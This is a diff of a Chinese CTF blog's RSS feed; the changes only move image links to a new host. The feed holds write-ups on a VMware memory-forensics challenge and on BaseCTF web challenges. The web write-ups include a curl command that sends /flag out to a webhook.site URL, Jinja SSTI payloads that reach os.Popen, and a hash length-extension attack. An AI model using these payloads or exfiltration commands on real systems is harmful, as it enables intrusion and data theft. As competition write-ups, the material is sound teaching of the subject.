 &lt;p&gt;将Encryption.bin01文件重命名为mem_secret-963a4663.vmss，vmss文件的文件名一定要和vmem文件名对应，否则无法读取挂起的状态&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201140903251.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201140903251.png&#34;
 	
 	
 	
@@ -983,7 +2292,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;然后打开Encryption.bin02文件发现一半是某种加密可见字符串,另一半出现较多乱码&lt;/p&gt;
 &lt;p&gt;将后半中的未加密字符串进行搜索发现提到加密和vmx文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201140924735.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201140924735.png&#34;
 	
 	
 	
@@ -994,7 +2303,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;打开本地kali的vmx文件发现是一些配置,由此看来是对配置信息进行了加密&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201140938097.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201140938097.png&#34;
 	
 	
 	
@@ -1005,7 +2314,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;拿我本地另一台机器加密实验一下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201140945724.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201140945724.png&#34;
 	
 	
 	
@@ -1015,7 +2324,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201140952484.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201140952484.png&#34;
 	
 	
 	
@@ -1026,7 +2335,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;加密后打开确实发现大量加密字符串,但是头部发现了一些信息是bin02文件没有的,判断部分关键信息被出题人删了,我们需要进行修复. 还有在vmx加密文件中未发现不可见字符串,所以判断bin02文件后半部分是另外一个文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141001334.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141001334.png&#34;
 	
 	
 	
@@ -1037,7 +2346,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;使用010将后半段单独提出来到一个16进制文本,&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241130140322514.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241130140322514.png&#34;
 	
 	
 	
@@ -1048,7 +2357,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;将关键字lsilogic丢入gpt,因为我们已经判断出前半部分为vmx文件,所以我们与vmdk文件作对比看看&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141014232.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141014232.png&#34;
 	
 	
 	
@@ -1059,7 +2368,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;经过比对发现大量相似特征,010导出后命名为vmem文件名+vmdk&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141023511.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141023511.png&#34;
 	
 	
 	
@@ -1069,7 +2378,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141032804.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141032804.png&#34;
 	
 	
 	
@@ -1080,7 +2389,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;注意: 这里一定要摆脱刻板印象,不是所有vmdk文件都很大!&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141038647.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141038647.png&#34;
 	
 	
 	
@@ -1092,7 +2401,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;接下来就是修复vmx文件然后尝试挂载该虚拟机然后解除加密即可得到明文文件进行内存取证&lt;/p&gt;
 &lt;p&gt;以下地方需要进行修复, 按照本地加密的样本来进行修复bin02文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141044773.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141044773.png&#34;
 	
 	
 	
@@ -1103,7 +2412,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;上面已经将后半部分提取出去, 直接改为vmx文件, 至此完成修复工作&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241130142515684.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241130142515684.png&#34;
 	
 	
 	
@@ -1133,7 +2442,7 @@
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;提示虚拟机加密, 可以使用这个项目来尝试破解密码&lt;a class=&#34;link&#34; href=&#34;https://github.com/axcheron/pyvmx-cracker&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://github.com/axcheron/pyvmx-cracker&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141101904.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141101904.png&#34;
 	
 	
 	
@@ -1146,7 +2455,7 @@
 &lt;p&gt;命令:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;python39 .\pyvmx-cracker.py -v mem_secret.vmx -d wordlist.txt&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;得到密码:1q2w3e4r&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141108658.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141108658.png&#34;
 	
 	
 	
@@ -1157,7 +2466,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;接下来就是移除加密&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141115202.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141115202.png&#34;
 	
 	
 	
@@ -1168,7 +2477,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;结果却发现无法移除加密,磁盘问题,说明vmdk文件仍然存在问题&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141122961.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141122961.png&#34;
 	
 	
 	
@@ -1180,7 +2489,7 @@
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;恢复vmdk&#34;&gt;恢复vmdk
 &lt;/h3&gt;&lt;p&gt;这个界面很明显是win10&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141229907.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141229907.png&#34;
 	
 	
 	
@@ -1195,7 +2504,7 @@
 &lt;p&gt;win10 iso镜像下载点&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/zh-cn/software-download/windows10&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://www.microsoft.com/zh-cn/software-download/windows10&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;下载步骤如下:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141237084.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141237084.png&#34;
 	
 	
 	
@@ -1205,7 +2514,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141244110.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141244110.png&#34;
 	
 	
 	
@@ -1215,7 +2524,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141250671.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141250671.png&#34;
 	
 	
 	
@@ -1225,7 +2534,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141258702.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141258702.png&#34;
 	
 	
 	
@@ -1239,7 +2548,7 @@
 &lt;/h4&gt;&lt;p&gt;新建一个Win10虚拟机,&lt;strong&gt;这里有个坑，记录一下&lt;/strong&gt;：我们发现这里不能选择拆分成多个文件，否则会导致有多个vmdk，同时内部格式也会与单个vmdk有所不同，最后也试过无法移除加密。&lt;/p&gt;
 &lt;p&gt;除了下面这个其他全部默认就好, 磁盘不够的话给个30就行,不用装系统&lt;/p&gt;
 &lt;p&gt;选择15系的&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141319398.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141319398.png&#34;
 	
 	
 	
@@ -1249,7 +2558,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141326733.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141326733.png&#34;
 	
 	
 	
@@ -1260,7 +2569,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;进行加密,我还是用的相同的密码:1q2w3e4r&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141332515.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141332515.png&#34;
 	
 	
 	
@@ -1271,7 +2580,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;打开题目附件里的损坏vmdk将0x18前的部分全部删除&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141337194.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141337194.png&#34;
 	
 	
 	
@@ -1282,7 +2591,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;接下来找到本地的win10 vmdk文件拖入010&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141341523.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141341523.png&#34;
 	
 	
 	
@@ -1293,7 +2602,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;找到偏移地址0x200处, 将光标移到0x18前面, 然后通过左上角 “编辑-插入/覆盖-覆盖文件&amp;quot;选取破损vmdk覆盖&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141346032.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141346032.png&#34;
 	
 	
 	
@@ -1304,7 +2613,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;覆盖后在偏移地址0x220处覆盖字节为vmware达成格式&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141349986.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141349986.png&#34;
 	
 	
 	
@@ -1315,7 +2624,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;覆盖后:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141354529.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141354529.png&#34;
 	
 	
 	
@@ -1329,7 +2638,7 @@
 &lt;blockquote&gt;
 &lt;p&gt;这里还有个坑：修复完成后不要试图开启虚拟机，否则vmem文件会被删除。&lt;/p&gt;&lt;/blockquote&gt;
 &lt;p&gt;在访问控制中移除加密成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141359201.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141359201.png&#34;
 	
 	
 	
@@ -1342,7 +2651,7 @@
 &lt;hr&gt;
 &lt;h3 id=&#34;内存取证&#34;&gt;内存取证
 &lt;/h3&gt;&lt;p&gt;终于成功加载了!&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141404285.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141404285.png&#34;
 	
 	
 	
@@ -1356,7 +2665,7 @@
 &lt;h4 id=&#34;问1&#34;&gt;问1
 &lt;/h4&gt;&lt;p&gt;取证人员首先对容器的基本信息进行核实，经过确定该容器的基本信息为________。（答案为32位小写md5(容器操作系统系统的版本号+容器主机名+系统用户名），例如：操作系统的版本号为10.0.22449，容器主机名为DESKTOP-0521,系统登录用户名为admin，则该题答案为32位小写md5(10.0.22449DESKTOP-0521admin) 的值ae278d9bc4aa5ee84a4aed858d17d52a)。得到的flag请使用NSSCTF{}格式提交。&lt;/p&gt;
 &lt;p&gt;利用一把梭工具得到主机名和用户&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141408809.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141408809.png&#34;
 	
 	
 	
@@ -1367,7 +2676,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;还是导出注册表然后使用wrr工具分析注册表&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141413404.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141413404.png&#34;
 	
 	
 	
@@ -1379,7 +2688,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;将&lt;code&gt;10.0.18363DESKTOP-4N21ET2Ado&lt;/code&gt;md5加密后得到flag&lt;/p&gt;
 &lt;p&gt;然而提交不对,看官方wp里面是6.3.18362 , 不知道哪出了问题&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141417917.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141417917.png&#34;
 	
 	
 	
@@ -1393,7 +2702,7 @@
 &lt;h4 id=&#34;问2&#34;&gt;问2
 &lt;/h4&gt;&lt;p&gt;黑客入侵容器后曾通过木马控制端使用Messagebox发送过一段信息，该信息的内容是____________。（答案为Messagebox信息框内内容）。得到的flag请使用NSSCTF{}格式提交。&lt;/p&gt;
 &lt;p&gt;挂起页面已经显示出来了, Best_hacker&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141422973.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141422973.png&#34;
 	
 	
 	
@@ -1407,7 +2716,7 @@
 &lt;h4 id=&#34;问3&#34;&gt;问3
 &lt;/h4&gt;&lt;p&gt;经过入侵分析发现该容器受到入侵的原因为容器使用人的违规进行游戏的行为，该使用人进行游戏程序的信息是__________。（答案为“32位小写md5(游戏程序注册邮箱+游戏程序登录用户名+游戏程序登录密码)，例如：注册邮箱为adol@163.com,登录用户名为user,密码为user1234，则该题答案为” &lt;a class=&#34;link&#34; href=&#34;mailto:adol@163.comuseruser1234&#34; &gt;adol@163.comuseruser1234&lt;/a&gt;”的小写md5值5f4505b7734467bfed3b16d5d6e75c16)。得到的flag请使用NSSCTF{}格式提交。&lt;/p&gt;
 &lt;p&gt;从快照和安装软件可以看到使用了steam&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141427595.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141427595.png&#34;
 	
 	
 	
@@ -1417,7 +2726,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141431733.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141431733.png&#34;
 	
 	
 	
@@ -1430,7 +2739,7 @@
 &lt;p&gt;拖到kali用正则搜索镜像中的邮箱&lt;/p&gt;
 &lt;p&gt;命令:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;strings mem_secret-963a4663.vmem | grep -E &amp;quot;[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}&amp;quot;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241130195337722.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241130195337722.png&#34;
 	
 	
 	
@@ -1443,7 +2752,7 @@
 &lt;p&gt;发现邮箱john@uuf.me多次在路径中出现而且存在该邮箱命名的文件夹,多半为用户邮箱&lt;/p&gt;
 &lt;p&gt;使用命令查找账号密码,拿到notepad++搜一下找到账号密码请求&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;strings mem_secret-963a4663.vmem -n 10 |grep -C 3 &amp;quot;password&amp;quot;&amp;gt;mem_secret-963a4663_output.txt&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141444793.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141444793.png&#34;
 	
 	
 	
@@ -1458,7 +2767,7 @@
 &lt;/h4&gt;&lt;p&gt;经过入侵分析发现该容器曾被黑客植入木马控制的信息是_________。（答案为“32位小写md5(木马程序进程名+木马回连ip地址+木马回连ip端口）”，例如：木马程序进程名为svhost.exe，木马回连ip为1.1.1.1，木马回连端口为1234，则该题答案为“svhost.exe1.1.1.11234”的32位小写md5值f02da74a0d78a13e7944277c3531bbea)。得到的flag请使用NSSCTF{}格式提交&lt;/p&gt;
 &lt;p&gt;根据第三题可以判断是攻击者通过映像劫持等技术造成机主在启动steam的时候马儿也生效了,我就直接先看异常对外连接再看进程了,因为进程多半伪装了没那么好找&lt;/p&gt;
 &lt;p&gt;发现异常对外连接,确定ip为192.168.241.147,回连端口为8808&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141450704.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141450704.png&#34;
 	
 	
 	
@@ -1469,7 +2778,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;进程列表搜索steam,玩过steam的都知道steam.exe还有很多其他服务比如steamhelper&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141454493.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141454493.png&#34;
 	
 	
 	
@@ -1480,7 +2789,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;第二个steam.exe单一个进程, 判断此进程为异常进程&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241130203707366.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241130203707366.png&#34;
 	
 	
 	
@@ -1502,7 +2811,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 vol.py -f mem_secret-963a4663.vmem --profile=Win10x64_18362 userassist
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20241201141505326.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20241201141505326.png&#34;
 	
 	
 	
@@ -1518,10 +2827,10 @@
         </item>
         <item>
         <title>BaseCTF招新赛 Web-Wp</title>
-        <link>http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/</link>
+        <link>https://2477231995.github.io/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/</link>
         <pubDate>Thu, 12 Sep 2024 17:26:54 +0800</pubDate>
         
-        <guid>http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/</guid>
+        <guid>https://2477231995.github.io/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/</guid>
         <description>&lt;h4 id=&#34;week2-really-ez-pop&#34;&gt;[Week2] Really EZ POP
 &lt;/h4&gt;&lt;p&gt;这道题记录一下的原因是因为这个php版本太低导致我们不能通过更改成员变量的属性来构造pop利用链，开始我就犯了这个错。不能改变属性但可以使用在类内部写入构造方法来构造链子&lt;/p&gt;
 &lt;p&gt;wp如下&lt;/p&gt;
@@ -1784,7 +3093,7 @@
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;https://wiki.wgpsec.org/knowledge/ctf/Hash-Leng-Extension.html&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;全局变量random长度为96&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912194345475.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912194345475.png&#34;
 	
 	
 	
@@ -1795,7 +3104,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;而name由我们传入可控，后面还会和md5($random)拼接，我们可以构造payload进行填充让新建一个分组包含后面需要验证的admin&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912194501769.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912194501769.png&#34;
 	
 	
 	
@@ -1805,7 +3114,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912194643351.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912194643351.png&#34;
 	
 	
 	
@@ -1818,7 +3127,7 @@
 &lt;p&gt;这里使用&lt;a class=&#34;link&#34; href=&#34;https://github.com/luoingly/attack-scripts/blob/main/logic/md5-extension-attack.py&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;工具&lt;/a&gt;生成了，我是菜比&lt;/p&gt;
 &lt;p&gt;先输入random的文本长度，然后是random的hash，最后是我们希望拓展的字符串&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912194812065.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912194812065.png&#34;
 	
 	
 	
@@ -1830,7 +3139,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;生成后选择url编码一次的payload，浏览器会自动对我们传递的参数进行一次解码。&lt;/p&gt;
 &lt;p&gt;然后再传入新的hash，虽然字符串上看起来不一样，但在md5分组运算的时候是一样的，所以两个md5判断为相等，由此拿到flag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912195117038.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912195117038.png&#34;
 	
 	
 	
@@ -1855,7 +3164,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat/cp/mv /flag &amp;gt; 1.txt
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912203112250.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912203112250.png&#34;
 	
 	
 	
@@ -1878,7 +3187,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl https://webhook.site/44f66666-8c8a-47bd-978a-84f7a596c7ff/`cat /flag | base64`
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912202923617.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912202923617.png&#34;
 	
 	
 	
@@ -1888,7 +3197,7 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912202934575.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912202934575.png&#34;
 	
 	
 	
@@ -2022,7 +3331,7 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BaseCTF{%print(&amp;#39;&amp;#39;[&amp;#39;_&amp;#39;&amp;#39;_cl&amp;#39;&amp;#39;ass_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_ba&amp;#39;&amp;#39;se_&amp;#39;&amp;#39;_&amp;#39;][&amp;#39;_&amp;#39;&amp;#39;_subcla&amp;#39;&amp;#39;sses_&amp;#39;&amp;#39;_&amp;#39;]())%}
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912204346922.png&#34;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912204346922.png&#34;
 	
 	
 	
@@ -2033,7 +3342,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;寻找一个含os模块能RCE的类，我这里懒得写脚本直接用Notepad++将逗号替换为换行符找到该模块的位置为137&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912204530622.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912204530622.png&#34;
 	
 	
 	
@@ -2053,7 +3362,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;发现Popen方法，可以用它执行命令再用read()读取即可&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912205307818.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912205307818.png&#34;
 	
 	
 	
@@ -2073,7 +3382,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;执行成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912205546055.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912205546055.png&#34;
 	
 	
 	
@@ -2085,7 +3394,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;但是发现根号被ban了，这里我开始只想到&lt;code&gt;${PATH:0:1}&lt;/code&gt;,后面一位大佬研究处&lt;code&gt;${HOME%%root}&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;一般HOME目录都在/root下&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912205752499.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912205752499.png&#34;
 	
 	
 	
@@ -2105,7 +3414,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;后面查看该系统环境变量存在一个为根号的环境变量&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://gucheng.me/img/image-20240912205859146.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://2477231995.github.io/img/image-20240912205859146.png&#34;
 	
 	
 	
@@ -2124,7 +3433,7 @@
